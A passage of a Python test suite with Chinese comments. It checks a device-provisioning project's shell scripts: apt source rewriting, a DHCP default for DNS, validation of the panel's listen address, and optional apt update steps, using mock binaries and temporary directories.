            log_fail("deb822 源未正确重写", s6[:250])
        active_bullseye = [ln for ln in s6.splitlines()
                           if "bullseye" in ln and not ln.startswith("# [onecloud-disabled]")]
        if "# [onecloud-disabled]" in s6 and not active_bullseye:
            log_pass("残留的 classic bullseye 源被注释, 不再有生效的重复源")
        else:
            log_fail("仍存在生效的 bullseye 源条目", str(active_bullseye)[:200])
        if "debian.sources.onecloud.bak" in b6 and "sources.list.onecloud.bak" in b6:
            log_pass("deb822 与 classic 源文件均留备份")
        else:
            log_fail("备份不完整", b6[:200])

        # --- s7/s8: 跳过换源的两种情况 ---
        s7 = sect("SOURCES", "s7_ubuntu")
        if rc("s7_ubuntu") == 0 and "非 Debian 系" in sect("OUT", "s7_ubuntu") \
                and "bullseye main contrib non-free" in s7:
            log_pass("非 Debian 系统跳过换源, 原源文件不被触碰")
        else:
            log_fail("非 Debian 系统处理不正确", s7[:200])
        s8 = sect("SOURCES", "s8_skip_mirror")
        if rc("s8_skip_mirror") == 0 and "换源: 跳过" in sect("OUT", "s8_skip_mirror") \
                and "bullseye main contrib non-free" in s8:
            log_pass("不换源 (DO_MIRROR=false) 时完全不动源文件")
        else:
            log_fail("跳过换源开关未生效", s8[:200])

        # --- s9: bullseye 机器 ---
        s9 = sect("SOURCES", "s9_bullseye")
        if rc("s9_bullseye") == 0 and "bullseye main contrib non-free" in s9 \
                and "non-free-firmware" not in s9:
            log_pass("bullseye 机器按实际代号写入, 且不写它没有的组件")
        else:
            log_fail("bullseye 代号或组件处理不正确", s9[:250])

        # --- s10: 包真的不存在时仍能透出原因 ---
        c10 = sect("OUT", "s10_dkms_install_100")
        if rc("s10_dkms_install_100") == 100 and "Unable to locate package wireguard-dkms" in c10:
            log_pass("apt 真失败时透出原始报错 (可定位到具体包)")
        else:
            log_fail("未透出 apt 原始报错", c10[-250:])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_bootstrap_dns_mode():
    """测试 22: bootstrap 的 DNS 新增「DHCP 自动获取」并设为默认

    背景: 原先 DNS 兜底写死 1.1.1.1 (lib-nodes.sh 亦然), 路由器已下发 DNS 的场景
    反而被硬编码盖掉, 也无法表达"不干预、交给系统"。改为默认 dhcp (自动获取)。
    """
    print("\n" + "=" * 60)
    print("测试 22: bootstrap DNS 模式 (DHCP 自动获取 / 静态指定)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    lib = SCRIPTS_DIR / "lib-nodes.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    inv = PROJECT_ROOT / "inventory" / "nodes.yaml"
    missing = [str(p) for p in (boot, lib, wg, inv) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return
    src = boot.read_text(encoding="utf-8")
    lsrc = lib.read_text(encoding="utf-8")
    wsrc = wg.read_text(encoding="utf-8")
    isrc = inv.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    if "dns_is_auto()" in src and "dns_apply_mode()" in src:
        log_pass("具备 DNS 取值归一化函数 (dns_is_auto / dns_apply_mode)")
    else:
        log_fail("缺少 DNS 取值归一化函数")

    if "--dns-dhcp" in src and "dhcp|auto|none|automatic" in src:
        log_pass("支持 --dns-dhcp 及 dhcp/auto/none 等自动获取写法")
    else:
        log_fail("未识别 dhcp/auto 等自动获取写法")

    if 'DNS_SERVERS="1.1.1.1"' in src:
        log_fail("DNS 兜底仍写死 1.1.1.1", "应改为 dhcp (自动获取)")
    else:
        log_pass("bootstrap 不再把 1.1.1.1 写死为 DNS 兜底")

    if '${_NODE_FIELD[__net__.dns]:-dhcp}' in lsrc:
        log_pass("清单未配 dns 时默认 dhcp (lib-nodes.sh)")
    else:
        log_fail("lib-nodes.sh 的 NET_DNS 仍兜底成固定地址")

    if re.search(r"^\s*dns:\s*dhcp\s*$", isrc, re.M):
        log_pass("inventory/nodes.yaml 的 network.dns 已同步为 dhcp")
    else:
        log_fail("清单默认值未同步为 dhcp", "清单与脚本默认值会漂移")

    if "WG_NET_DNS" in wsrc:
        log_pass("wireguard 对 dhcp 标记做了回退 (wg0.conf 必须是具体地址)")
    else:
        log_fail("wireguard 会把 dhcp 字面值写进 wg0.conf", "客户端无法解析")

    # ---- 2) 行为验证: 跑真实脚本的 dry-run / 交互 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t22_"))

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def run_boot(args, env_extra=None, stdin_data=None, tty="0", timeout=90):
        """跑 bootstrap。

        stdin 必须按**字节**喂: Windows 上 Python 的 text 模式会把 "\\n" 转成
        "\\r\\n", bash 的 read 会把 \\r 当成内容读进去 (交互测试会因此拿到 "\\r"
        而不是空串), 导致断言以肉眼看不见的方式失败。
        """
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = tty
        env["ONECLOUD_ETC_ROOT"] = _posix(tmpdir)   # 越界也不会碰真实 /etc
        if env_extra:
            env.update(env_extra)
        kwargs = dict(capture_output=True, env=env, cwd=str(SCRIPTS_DIR),
                      timeout=timeout)
        if stdin_data is None:
            kwargs["stdin"] = subprocess.DEVNULL
        else:
            kwargs["input"] = stdin_data.encode("utf-8")
        r = subprocess.run(["bash", _posix(boot)] + args, **kwargs)
        return subprocess.CompletedProcess(
            r.args, r.returncode,
            r.stdout.decode("utf-8", "replace"),
            r.stderr.decode("utf-8", "replace"))

    def dns_of(out):
        m = re.search(r"^\s*DNS:\s+(.*?)\s{2,}\(来源:\s*([^)]+)\)", out, re.M)
        return m.groups() if m else (None, None)

    base = ["--node", "wk-edge-01", "--ip", "192.168.1.101", "--hostname", "edge-01"]

    try:
        # 默认 (清单 dns: dhcp)
        r = run_boot(base + ["--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "自动获取 (DHCP)" and "将设置: DNS 不写入" in r.stdout:
            log_pass("默认即为自动获取 (清单未强制静态 DNS)")
        else:
            log_fail(f"默认 DNS 不是自动获取: {val} / 来源={srce}")

        # 三种等价写法
        for arg in (["--dns", "auto"], ["--dns", "none"], ["--dns-dhcp"]):
            r = run_boot(base + arg + ["--dry-run"])
            val, srce = dns_of(r.stdout)
            if val == "自动获取 (DHCP)" and srce == "命令行":
                log_pass(f"{' '.join(arg)} 识别为自动获取")
            else:
                log_fail(f"{' '.join(arg)} 未识别为自动获取: {val} / {srce}")

        # 静态指定
        r = run_boot(base + ["--dns", "1.1.1.1,8.8.8.8", "--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "1.1.1.1, 8.8.8.8" and "将设置: DNS = 1.1.1.1, 8.8.8.8" in r.stdout:
            log_pass("--dns 指定多个地址时按列表写入")
        else:
            log_fail(f"静态 DNS 处理不正确: {val} / {srce}")

        # 环境变量
        r = run_boot(base + ["--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "223.5.5.5" and srce == "环境变量":
            log_pass("ONECLOUD_DNS 生效并标注来源")
        else:
            log_fail(f"ONECLOUD_DNS 未生效: {val} / {srce}")

        # 优先级: --dns > ONECLOUD_DNS
        r = run_boot(base + ["--dns", "8.8.8.8", "--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "8.8.8.8" and srce == "命令行":
            log_pass("--dns 优先于 ONECLOUD_DNS")
        else:
            log_fail(f"优先级错误: {val} / {srce}")

        # 交互: 回车 = 自动获取, 且在确认环节取消 (不会修改系统)
        # 输入前两个回车用于跳过 v1.4.5 新增的 apt 开关询问 (换源 / 更新)
        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="\n\n\nn\n", tty="1")
        if "自动获取 (DHCP)" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式直接回车 = 自动获取 (且确认前可安全取消)")
        else:
            log_fail("交互式回车未走自动获取", r.stdout[-300:])

        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="\n\n8.8.8.8\nn\n", tty="1")
        if "8.8.8.8" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式输入地址覆盖默认值")
        else:
            log_fail("交互式覆盖失败", r.stdout[-300:])

        # ---- 3) 步骤 11 实际写盘 (4 种组合) ----
        lines = src.splitlines()
        i11 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 11. 设置静态 IP")), -1)
        i12 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 12. 配置")), -1)
        if min(i11, i12) < 0:
            log_fail("无法定位步骤 11 锚点", "代码结构变了, 需同步更新本测试")
            return
        flow11 = "\n".join(lines[i11:i12])
        probe = tmpdir / "probe11.sh"
        probe.write_text(
            'GREEN=""; YELLOW=""; RED=""; NC=""\n'
            'log_info()  { echo "[INFO] $*"; }\n'
            'log_warn()  { echo "[WARN] $*"; }\n'
            'log_error() { echo "[ERROR] $*"; }\n'
            + flow11 + "\n",
            encoding="utf-8", newline="\n")

        def run_step11(tag, layout, mode, servers, dlist):
            root = tmpdir / f"etc_{tag}"
            if layout == "ifupdown":
                (root / "network").mkdir(parents=True, exist_ok=True)
                (root / "network" / "interfaces").write_text("", encoding="utf-8")
                artifact = root / "network" / "interfaces"
            else:
                (root / "netplan").mkdir(parents=True, exist_ok=True)
                artifact = root / "netplan" / "99-static.yaml"
            env = dict(os.environ)
            env.update({
                "ONECLOUD_ETC_ROOT": _posix(root),
                "NODE_IP": "192.168.6.101", "LAN_PREFIX": "24",
                "GATEWAY": "192.168.6.1", "DNS_MODE": mode,
                "DNS_SERVERS": servers, "DNS_LIST": dlist,
            })
            subprocess.run(["bash", _posix(probe)], env=env, cwd=str(SCRIPTS_DIR),
                           capture_output=True, text=True, encoding="utf-8",
                           errors="replace", stdin=subprocess.DEVNULL, timeout=60)
            return artifact.read_text(encoding="utf-8") if artifact.exists() else ""

        s = run_step11("a", "ifupdown", "dhcp", "", "自动获取 (DHCP)")
        if "address 192.168.6.101/24" in s and "dns-nameservers" not in s:
            log_pass("ifupdown + 自动获取: 写静态地址但不写 dns-nameservers")
        else:
            log_fail("ifupdown 自动获取模式下仍写入了 dns-nameservers", s[:200])

        s = run_step11("b", "ifupdown", "static", "1.1.1.1,8.8.8.8", "1.1.1.1, 8.8.8.8")
        if "dns-nameservers 1.1.1.1, 8.8.8.8" in s:
            log_pass("ifupdown + 静态指定: 正常写入 dns-nameservers")
        else:
            log_fail("ifupdown 静态 DNS 未写入", s[:200])

        s = run_step11("c", "netplan", "dhcp", "", "自动获取 (DHCP)")
        if "dhcp4: true" in s and "use-routes: false" in s and "nameservers" not in s:
            log_pass("netplan + 自动获取: dhcp4 只取 DNS (关 use-routes), 不写 nameservers")
        else:
            log_fail("netplan 自动获取配置不正确", s[:250])
        if "addresses:" in s and "192.168.6.101/24" in s and "via: 192.168.6.1" in s:
            log_pass("netplan 自动获取模式仍保留静态地址与静态网关")
        else:
            log_fail("netplan 静态地址/网关丢失", s[:250])

        s = run_step11("d", "netplan", "static", "223.5.5.5", "223.5.5.5")
        if "nameservers:" in s and "- 223.5.5.5" in s and "dhcp4" not in s:
            log_pass("netplan + 静态指定: 写 nameservers 列表, 不启用 dhcp4")
        else:
            log_fail("netplan 静态 DNS 配置不正确", s[:250])

        # ---- 4) 文档同步 ----
        readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
        if "DNS 默认为 `dhcp`" in readme and "--dns-dhcp" in readme:
            log_pass("README 已记录 DNS 默认值与自动获取写法")
        else:
            log_fail("README 未说明新的 DNS 默认行为", "文档与实际行为会漂移")

        sreadme = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
        if "dhcp" in sreadme and "DNS" in sreadme:
            log_pass("scripts/README 已同步 DNS 说明")
        else:
            log_fail("scripts/README 未同步 DNS 说明")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试23: 面板监听地址 ============
def test_panel_listen_host():
    """测试 23: 面板监听地址 —— 拦截「网段地址 / 回环网络地址」等绑不上的取值

    背景: 监听地址此前是自由文本、零校验。填成 127.0.0.0 (回环网段的网络地址)
    或 192.168.1.0 (想表达"同网段"却写成了网段地址) 都不会当场报错, 要等
    systemd 启动 app.py 才以 "Cannot assign requested address" 失败, 报错信息
    里看不出真正原因。

    本组验证三层防线:
      1) init.sh           交互引导 —— 首选本机局域网地址, 误填时给出原因与替代值
      2) install-service.sh 入参校验 —— 被直接调用时也不放行
      3) app.py            运行时校验 —— 绕过前两层也拦得住
    """
    print("\n" + "=" * 60)
    print("测试 23: 面板监听地址 (误填拦截 / 同网段引导)")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-panel-host.sh"
    entry = PROJECT_ROOT / "init" / "init.sh"
    service = PANEL_DIR / "install-service.sh"
    app_py = PANEL_DIR / "app.py"
    missing = [str(p) for p in (lib, entry, service, app_py) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    src = entry.read_text(encoding="utf-8")
    ssrc = service.read_text(encoding="utf-8")
    asrc = app_py.read_text(encoding="utf-8")
    lsrc = lib.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    need_fns = ["panel_detect_local_ipv4", "panel_host_check", "panel_host_is_local",
                "panel_host_desc", "panel_host_cidr"]
    missing_fns = [fn for fn in need_fns
                   if not re.search(r'^' + re.escape(fn) + r'\(\)\s*\{', lsrc, re.MULTILINE)]
    if missing_fns:
        log_fail(f"lib-panel-host.sh 缺少函数: {missing_fns}")
    else:
        log_pass(f"lib-panel-host.sh 函数齐全（{len(need_fns)} 个）")

    if "${SCRIPTS_DIR}/lib-panel-host.sh" in src:
        log_pass("init.sh 已接入 lib-panel-host.sh（校验逻辑单一实现）")
    else:
        log_fail("init.sh 未接入 lib-panel-host.sh", "监听地址校验不应各自实现")

    if "请输入监听地址 (例 0.0.0.0 或 127.0.0.1)" in src:
        log_fail("init.sh 仍用无校验的自由文本读监听地址",
                 "该写法会原样放行 127.0.0.0 / 192.168.1.0")
    else:
        log_pass("init.sh 不再用无校验的自由文本读监听地址")

    if re.search(r"^panel_choose_host\(\)\s*\{", src, re.MULTILINE):
        log_pass("init.sh 提供面板监听地址选择流程 (panel_choose_host)")
    else:
        log_fail("init.sh 缺少 panel_choose_host")

    if "本机局域网地址" in src and "手动输入其它 IPv4 地址" in src:
        log_pass("监听地址菜单含「本机局域网地址」与手动输入选项")
    else:
        log_fail("监听地址菜单缺少「本机局域网地址」选项")

    if "panel_host_check" in ssrc and "PANEL_HOST_SUGGEST" in ssrc:
        log_pass("install-service.sh 对注入的 PANEL_HOST 做了校验")
    else:
        log_fail("install-service.sh 未校验 PANEL_HOST",
                 "绕过 init.sh 直接调用时会写入绑不上的地址")

    if "def resolve_bind_host" in asrc and "sys.exit(2)" in asrc:
        log_pass("app.py 在启动前校验绑定地址 (resolve_bind_host)")
    else:
        log_fail("app.py 未校验 PANEL_HOST")

    if "127.0.0.0" in asrc or "octets[3] in (0, 255)" in asrc:
        log_pass("app.py 明确拦住了网段地址与广播地址")
    else:
        log_fail("app.py 未拦住网段地址")

    # ---- 2) 行为验证: 用 mock `ip` 提供一张假网卡 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t23_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir(parents=True, exist_ok=True)

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    # mock iproute2: 一台同时有 eth0 192.168.1.101/24 与 wg0 10.8.0.101/24 的机器
    ip_mock = ("#!/bin/bash\n"
               "case \"$*\" in\n"
               "    *addr*)\n"
               "        printf '2: eth0    inet 192.168.1.101/24 brd 192.168.1.255 scope global eth0\\n'\n"
               "        printf '4: wg0     inet 10.8.0.101/24 scope global wg0\\n'\n"
               "        ;;\n"
               "esac\n"
               "exit 0\n")
    # 空壳 python3: 只为让 init.sh 的 pick_python 通过 (测试全程在确认环节取消)
    for name, body in (("ip", ip_mock), ("python3", "#!/bin/bash\nexit 0\n")):
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        try:
            os.chmod(p, 0o755)
        except OSError:
            pass

    def env_mock():
        env = dict(os.environ)
        env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"   # 白名单式 PATH, 不继承宿主注入
        return env

    def run_lib(script):
        r = subprocess.run(["bash", "-c", script], capture_output=True, env=env_mock(),
                           cwd=str(PROJECT_ROOT), timeout=60)
        return r.returncode, r.stdout.decode("utf-8", "replace")

    # 判定表: 地址 -> 是否可作监听地址
    cases = [
        ("127.0.0.0", False), ("127.0.0.1", True), ("192.168.1.0", False),
        ("192.168.1.255", False), ("192.168.1.101", True), ("192.168.1.254", True),
        ("10.8.0.101", True), ("0.0.0.0", True), ("0.1.2.3", False),
        ("224.0.0.1", False), ("240.0.0.1", False), ("255.255.255.255", False),
        ("169.254.1.1", False), ("192.168.1", False), ("192.168.1.256", False),
        ("abc", False), ("::1", False),
    ]
    script = ('. "$PWD/scripts/lib-panel-host.sh"\n'
              'for ip in ' + " ".join(f"'{c[0]}'" for c in cases) + '; do\n'
              '    if panel_host_check "$ip"; then\n'
              '        printf "%s|OK|%s\\n" "$ip" "${PANEL_HOST_SUGGEST}"\n'
              '    else\n'
              '        printf "%s|NG|%s\\n" "$ip" "${PANEL_HOST_SUGGEST}"\n'
              '    fi\n'
              'done\n')
    _, out = run_lib(script)
    got = {}
    for ln in out.splitlines():
        parts = ln.split("|")
        if len(parts) == 3:
            got[parts[0]] = (parts[1] == "OK", parts[2])

    wrong = [(ip, want) for ip, want in cases if got.get(ip, (None,))[0] is not want]
    if wrong:
        log_fail(f"判定不符预期: {wrong}")
    else:
        log_pass(f"监听地址判定正确（{len(cases)} 个取值: 网络/广播/组播/保留/回环/非法格式/合法）")

    # 误填时的替代值: 这正是「想同网段可访问」的落点
    suggest_map = [("127.0.0.0", "127.0.0.1"), ("192.168.1.0", "192.168.1.101"),
                   ("192.168.1.255", "192.168.1.101")]
    bad_suggest = [(ip, got.get(ip, ("", ""))[1], want)
                   for ip, want in suggest_map if got.get(ip, ("", ""))[1] != want]
    if bad_suggest:
        log_fail(f"替代值不符预期: {bad_suggest}")
    else:
        log_pass("误填网段地址/回环网络地址时给出可用替代值（含本机在该网段的地址）")

    # 归属与本机网段
    script = ('. "$PWD/scripts/lib-panel-host.sh"\n'
              'for ip in 192.168.1.101 10.8.0.101 127.0.0.1 192.168.1.102; do\n'
              '    if panel_host_is_local "$ip"; then echo "$ip|yes"; else echo "$ip|no"; fi\n'
              'done\n'
              'echo "cidr|$(panel_host_cidr 192.168.1.101)"\n'
              'echo "desc|$(panel_host_desc 192.168.1.101)"\n')
    _, out = run_lib(script)
    if "192.168.1.101|yes" in out and "10.8.0.101|yes" in out and "127.0.0.1|yes" in out \
            and "192.168.1.102|no" in out:
        log_pass("本机地址归属判定正确 (含 127.0.0.1 特例)")
    else:
        log_fail("本机地址归属判定有误")

    if "cidr|192.168.1.0/24" in out:
        log_pass("网段展示取网络地址而非主机地址 (192.168.1.0/24)")
    else:
        log_fail("网段展示有误", "应显示 192.168.1.0/24 而不是 192.168.1.101/24")

    if "同网段 192.168.1.0/24 可访问" in out:
        log_pass("描述文案点明「同网段可访问」")
    else:
        log_fail("描述文案未说明访问范围")

    # ---- 3) install-service.sh 入参校验 (截到落盘/写 unit 之前) ----
    # 锚点取"落盘"注释行: 校验逻辑都在它之前, 而它之后会写文件 (测试不该落盘)
    anchor = "# ---- 落盘: 合并写 panel.env"
    probe = PANEL_DIR / "_probe_t23.sh"
    probe.write_text(ssrc[:ssrc.index(anchor)] + "\nexit 0\n", encoding="utf-8", newline="\n")
    try:
        for host, want_ok in (("127.0.0.0", False), ("192.168.1.0", False), ("abc", False),
                              ("192.168.1.101", True), ("0.0.0.0", True), ("127.0.0.1", True)):
            env = env_mock()
            env["PANEL_HOST"] = host
            r = subprocess.run(["bash", _posix(probe)], capture_output=True, env=env,
                               cwd=str(PROJECT_ROOT), timeout=60)
            ok = r.returncode == 0
            if ok != want_ok:
                log_fail(f"install-service.sh 对 PANEL_HOST={host} 的处理不符预期",
                         f"期望{'放行' if want_ok else '拒绝'}, 实际退出码 {r.returncode}")
            else:
                log_pass(f"install-service.sh {'放行' if want_ok else '拒绝'} PANEL_HOST={host}")

        env = env_mock()
        env["PANEL_HOST"] = "127.0.0.0"
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, env=env,
                           cwd=str(PROJECT_ROOT), timeout=60)
        msg = (r.stdout + r.stderr).decode("utf-8", "replace")
        if "建议改用: 127.0.0.1" in msg:
            log_pass("install-service.sh 拒绝时给出可采用的替代值")
        else:
            log_fail("install-service.sh 拒绝时未给出替代值")
    finally:
        try:
            probe.unlink()
        except OSError:
            pass

    # ---- 4) app.py 运行时校验 ----
    m = re.search(r"^def resolve_bind_host\(raw\):.*?(?=\n\nif __name__)", asrc, re.S | re.MULTILINE)
    if not m:
        log_fail("未能从 app.py 抽出 resolve_bind_host")
    else:
        ns = {"sys": sys}
        exec(compile(m.group(0), "app.py", "exec"), ns)
        fn = ns["resolve_bind_host"]
        import io as _io
        from contextlib import redirect_stderr

        rejects = ["127.0.0.0", "192.168.1.0", "192.168.1.255", "224.0.0.1",
                   "0.1.2.3", "abc", "192.168.1.256"]
        accepts = [("0.0.0.0", "0.0.0.0"), ("127.0.0.1", "127.0.0.1"),
                   ("192.168.1.101", "192.168.1.101")]
        bad = []
        for host in rejects:
            try:
                with redirect_stderr(_io.StringIO()):
                    fn(host)
                bad.append(host)
            except SystemExit:
                pass
        for host, want in accepts:
            try:
                with redirect_stderr(_io.StringIO()):
                    val = fn(host)
                if val != want:
                    bad.append(host)
            except SystemExit:
                bad.append(host)
        if bad:
            log_fail(f"app.py 绑定地址校验不符预期: {bad}")
        else:
            log_pass(f"app.py 绑定地址校验正确（拒绝 {len(rejects)} 个 / 放行 {len(accepts)} 个）")

        try:
            with redirect_stderr(_io.StringIO()) as buf:
                fn("127.0.0.0")
        except SystemExit:
            if "127.0.0.1" in buf.getvalue():
                log_pass("app.py 拒绝时提示改用 127.0.0.1")
            else:
                log_fail("app.py 拒绝时未提示正确写法")

    # ---- 5) init.sh 交互: 误填拦截与同网段引导 ----
    def run_init(steps, timeout=120):
        env = env_mock()
        data = ("\n".join(steps) + "\n").encode("utf-8")   # stdin 必须按字节喂
        r = subprocess.run(["bash", "init/init.sh"], cwd=str(PROJECT_ROOT), input=data,
                           capture_output=True, env=env, timeout=timeout)
        return r.stdout.decode("utf-8", "replace") + r.stderr.decode("utf-8", "replace")

    # 主菜单: 部署面板 -> 前台试运行 -> 不重生成配置 -> 不装依赖
    PRE = ["1", "2", "n", "n"]
    TAIL = ["admin", "pw123456", "n", "", "4", "7"]   # 用户名/密码/取消部署/暂停/返回/退出

    try:
        # 选「本机局域网地址」= 同网段可访问
        out = run_init(PRE + ["9000", "2"] + TAIL)
        if "监听地址 : 192.168.1.101" in out and "同网段可直接访问" in out:
            log_pass("菜单选「本机局域网地址」采用本机网卡地址（同网段可访问）")
        else:
            log_fail("菜单选「本机局域网地址」未采用本机地址")
        if "同网段 192.168.1.0/24 可访问" in out:
            log_pass("配置汇总标注访问范围与网段")
        else:
            log_fail("配置汇总未标注访问范围")

        # 手动输入 127.0.0.0 -> 拒绝 + 建议 127.0.0.1 + 采纳
        out = run_init(PRE + ["9000", "4", "127.0.0.0", "y"] + TAIL)
        if "127.0.0.0 是回环网段的网络地址" in out and "建议改为: 127.0.0.1" in out:
            log_pass("手动输入 127.0.0.0 被拒绝并给出原因")
        else:
            log_fail("127.0.0.0 未被正确拒绝")
        if "监听地址 : 127.0.0.1" in out and "仅本机" in out:
            log_pass("采纳建议后落到 127.0.0.1（仅本机）")
        else:
            log_fail("未采纳建议值")

        # 手动输入 192.168.1.0（想表达"同网段"）-> 引导到本机地址
        out = run_init(PRE + ["9000", "4", "192.168.1.0", "y"] + TAIL)
        if "192.168.1.0 是网络地址" in out and "建议改为: 192.168.1.101" in out:
            log_pass("手动输入网段地址被拒绝并引导到本机在该网段的地址")
        else:
            log_fail("网段地址未被正确引导")

        # 非本机地址: 告警后仍须显式确认, 答 n 则要求重新输入
        out = run_init(PRE + ["9000", "4", "192.168.9.9", "n", "192.168.1.101"] + TAIL)
        if "不在本机任何网卡上" in out:
            log_pass("非本机地址给出启动会失败的告警")
        else:
            log_fail("非本机地址未告警")
        if "监听地址 : 192.168.1.101" in out:
            log_pass("拒绝非本机地址后要求重新输入")
        else:
            log_fail("拒绝后未重新收集地址")

        # 0.0.0.0 与 127.0.0.1 的暴露面提示
        out = run_init(PRE + ["9000", "1"] + TAIL)
        if "会在全部网卡上监听" in out and "全部网卡 (含 WireGuard / 外网网卡)" in out:
            log_pass("选 0.0.0.0 时提示暴露面（含 WireGuard / 外网网卡）")
        else:
            log_fail("选 0.0.0.0 未提示暴露面")

        out = run_init(PRE + ["9000", "3"] + TAIL)
        if "仅监听 127.0.0.1" in out and "仅本机 (远端访问需 SSH 端口转发)" in out:
            log_pass("选 127.0.0.1 时说明仅本机可访问")
        else:
            log_fail("选 127.0.0.1 未说明访问范围")
    except subprocess.TimeoutExpired:
        log_fail("init.sh 交互测试超时")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试24: bootstrap apt 动作可选化 ============
def test_bootstrap_apt_optional():
    """测试 24: bootstrap 的换源/更新改为可选且默认跳过

    背景: 此前初始化必然换源 + 必然 apt update/upgrade。现场代价:
    换源失败会留下半截源文件, 升级可能拉入新内核让机器起不来,
    而多数节点跑脚本前源和索引其实已经就绪。
    v1.4.5 起四项 (换源/刷索引/升级/装基础工具) 各自独立, 默认都不做。
    """
    print("\n" + "=" * 60)
    print("测试 24: bootstrap apt 动作可选化 (默认跳过)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")
    lines = src.splitlines()

    # ---- 1) 静态检查 ----
    needed = ["apt_switch_defaults()", "apt_switch_fixup()", "apt_switch_desc()",
              "apt_switch_all_off()"]
    missing = [n for n in needed if n not in src]
    if missing:
        log_fail(f"缺少 apt 开关相关函数: {missing}")
    else:
        log_pass("具备 apt 开关函数 (默认值 / 联动 / 摘要 / 全关判定)")

    flags = ["--mirror", "--no-mirror", "--apt-update", "--apt-upgrade",
             "--no-apt-pkgs", "--no-apt"]
    absent = [f for f in flags if f not in src]
    if absent:
        log_fail(f"缺少选项: {absent}")
    else:
        log_pass("提供 --mirror / --apt-update / --apt-upgrade / --no-apt-pkgs / --no-apt")

    if re.search(r"DO_MIRROR=false\s*$", src, re.M) \
            and re.search(r"DO_APT_UPDATE=false\s*$", src, re.M) \
            and re.search(r"DO_APT_UPGRADE=false\s*$", src, re.M):
        log_pass("换源/刷索引/升级三项默认 false (默认跳过)")
    else:
        log_fail("默认值不是跳过", "换源与更新仍会自动执行")

    if re.search(r"DO_APT_PKGS=true\s*$", src, re.M):
        log_pass("基础工具安装默认仍执行 (可用 --no-apt-pkgs 关)")
    else:
        log_fail("基础工具安装默认被关掉", "会与历史行为不一致")

    if "ONECLOUD_APT_SKIP_MIRROR" in src and "ONECLOUD_APT_SKIP_ALL" in src:
        log_pass("保留旧开关并新增总开关 (向后兼容)")
    else:
        log_fail("旧开关被移除", "已有脚本/文档会失效")

    # ---- 2) 行为验证: 切片 + mock apt, 逐个开关组合 ----
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法定位 helper / 步骤锚点", "代码结构变了, 需同步更新本测试")
        return

    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t24_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "apt": r"""#!/bin/bash
echo "apt $*" >> "$APT_LOG"
exit 0
""",
        "apt-cache": r"""#!/bin/bash
echo "apt-cache $*" >> "$APT_LOG"
exit 0
""",
        "uname": r"""#!/bin/bash
[ "$1" = "-r" ] && { echo "5.10.63-rockchip"; exit 0; }
echo Linux
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1"
    shift
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=debian\nVERSION_CODENAME=bookworm\n' > "$root/os-release"
    cat > "$root/apt/sources.list" <<'EOS'
deb http://deb.debian.org/debian bookworm main
EOS
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"

    # 复位: 先清掉所有开关与环境变量, 再用 apt_switch_defaults 取默认值
    unset DO_MIRROR DO_APT_UPDATE DO_APT_UPGRADE DO_APT_PKGS
    unset APT_UPDATE_AUTO APT_UPDATE_EXPLICIT
